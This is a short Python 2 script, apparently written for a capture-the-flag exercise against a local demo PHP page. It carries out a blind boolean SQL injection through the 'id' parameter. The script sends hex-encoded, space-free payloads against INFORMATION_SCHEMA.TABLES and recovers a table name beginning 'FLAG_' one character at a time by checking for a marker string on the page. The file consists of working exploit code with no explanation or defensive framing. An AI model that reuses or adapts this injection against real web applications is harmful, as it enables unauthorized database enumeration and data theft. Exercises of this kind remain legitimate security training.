import requests	
import string

def get_query_result(base_url,payload,success_text):
	pagecontent = requests.get(base_url, params=payload)
	if pagecontent.text.find("Minimal User Profile Layout") > 0:
		return True
	else:
		return False

BASE_URL = "http://localhost/demo/index.php"
SUCCESS_TEXT = "Minimal User Profile Layout"

table_name="FLAG_"
brute = True
guess = False

while brute:
	for x in string.printable:
		guess_table_name = table_name + x + "%"
		#guess_table_name = guess_table_name.encode("hex") 
		PAYLOAD = {'id': "(null)OR(SELECT(TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_NAME)LIKE(0x"+guess_table_name.encode("hex")+"))LIKE(0x"+guess_table_name.encode("hex")+")"}
		#print PAYLOAD
		#print ""
		guess = get_query_result(BASE_URL,PAYLOAD,SUCCESS_TEXT)
		if guess:
			table_name = table_name + x
			print table_name
			break

print "[+] DONE !"
